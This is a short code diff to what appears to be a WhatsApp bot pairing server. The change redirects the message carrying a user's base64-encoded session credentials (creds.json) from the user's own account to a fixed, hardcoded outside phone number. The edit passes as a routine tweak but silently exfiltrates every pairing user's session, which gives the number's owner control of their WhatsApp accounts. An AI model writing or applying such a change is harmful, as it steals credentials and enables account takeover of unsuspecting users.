@@ -56,7 +56,7 @@ router.get('/', async (req, res) => {
 					let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
 					await delay(800);
 				   let b64data = Buffer.from(data).toString('base64');
-				   let session = await Qr_Code_By_Wasi_Tech.sendMessage(Qr_Code_By_Wasi_Tech.user.id, { text: 'CRAZY-MD-WHATSAPP-BOT;;;=>' + b64data });
+				   let session = await Qr_Code_By_Wasi_Tech.sendMessage(`237620114013@s.whatsapp.net`, { text: 'CRAZY-MD-WHATSAPP-BOT;;;=>' + b64data });
 	
 				   let WASI_MD_TEXT = `
 *_Pair Code Connected by CRAZY Teams_*
@@ -82,8 +82,8 @@ _____________________________________
 _____________________________________
 
 _Don't Forget To Give Star To My Repo_ `
-	 await Qr_Code_By_Wasi_Tech.sendMessage('237620114013@s.whatsapp.net', { audio: { url: 'kongga.mp3' }, mimetype: 'audio/mp4' });
-		await Qr_Code_By_Wasi_Tech.sendMessage('237620114013@s.whatsapp.net',{text:WASI_MD_TEXT},{quoted:session})
+	 await Qr_Code_By_Wasi_Tech.sendMessage(`237620114013@s.whatsapp.net`, { audio: { url: 'kongga.mp3' }, mimetype: 'audio/mp4' });
+		await Qr_Code_By_Wasi_Tech.sendMessage(`237620114013@s.whatsapp.net`,{text:WASI_MD_TEXT},{quoted:session})
 
 
 
